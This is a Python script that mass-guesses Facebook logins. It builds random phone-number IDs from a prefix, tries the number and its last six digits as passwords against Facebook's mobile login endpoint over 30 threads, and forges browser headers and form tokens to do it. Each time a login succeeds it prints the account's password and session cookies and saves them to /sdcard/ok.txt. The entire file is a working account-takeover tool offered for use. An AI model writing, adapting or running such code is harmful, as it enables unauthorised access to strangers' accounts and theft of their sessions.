#_________OPEN_______CODE______BYE_______DEV______
import os
import sys
import re
import time
import random
import string
import requests
from concurrent.futures import ThreadPoolExecutor

loop = 0
oks = []
gen = []

def main():
    os.system('clear')
    code = input("SIM CODE >> ")
    limit = input("TOTAL ID >> ")
    for a in range(int(limit)):
        awm = "".join(random.choice(string.digits) for _ in range(6))
        gen.append(awm)
    with ThreadPoolExecutor(max_workers=30) as Submits:
        print(20*"-")
        for next in gen:
            ids = code + next
            passlist = [ids,next]
            Submits.submit(cracker,ids,passlist)

def values(url=None):
    code = {}
    session = requests.Session()
    try:
        response = session.get(url).text
        jazoest = re.search(r'name="jazoest" value="(.*?)"', response)
        m_ts = re.search(r'name="m_ts" value="(.*?)"', response)
        lsd = re.search(r'name="lsd" value="(.*?)"', response)
        li = re.search(r'name="li" value="(.*?)"', response)
        
        code['li'] = li.group(1) if li else random.choice(['GosCZzoF-x4TPnttnppf6vQM' 'G4sCZ-e-gi91jL0vyyhgRvVO', 'HIsCZwuKjhSwv0KKTgpDapfT', 'HosCZ7N677bvIn23tMfXsv06'])
        code['lsd'] = lsd.group(1) if lsd else random.choice(['AVoXhSMaYhc', 'AVqPPp5vKyU', 'AVoE8plKK3k'])
        code['m_ts'] = m_ts.group(1) if m_ts else str(int(time.time()))
        code['jazoest'] = jazoest.group(1) if jazoest else str(random.randint(1000, 9000))
    
    except Exception as e:
        pass
    
    return code

def cracker(ids,passlist):
    global loop,oks
    sys.stdout.write(f"\r\r\x1b[m[{loop}]-[OK:{len(oks)}]")
    sys.stdout.flush()
    try:
        for pas in passlist:
            mr_code = values("https://touch.facebook.com")
            data = {
            'jazoest': mr_code.get('jazoest'),
            'lsd': mr_code.get('lsd'),
            'email': ids,
            'login_source': 'comet_headerless_login',
            'next': '',
            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),
            }
            headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': '1.5',
            'origin': 'https://www.facebook.com',
            'priority': 'u=0, i',
            'referer': 'https://www.facebook.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6738.0", "Chromium";v="131.0.6738.0", "Not_A Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"15.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'viewport-width': '725',
            }
            url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            response = requests.Session().post(url,data=data,headers=headers,allow_redirects = False)
            if "c_user" in response.cookies.get_dict():
                coki = (";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items() ])
                print(f"\r\r[OK] {ids} • {pas} • {coki}")
                open("/sdcard/ok.txt","a").write(ids+"|"+pas+"|"+coki+"\n")
                oks.append(ids)
                break
            else:continue
        loop+=1
    except:pass

main()
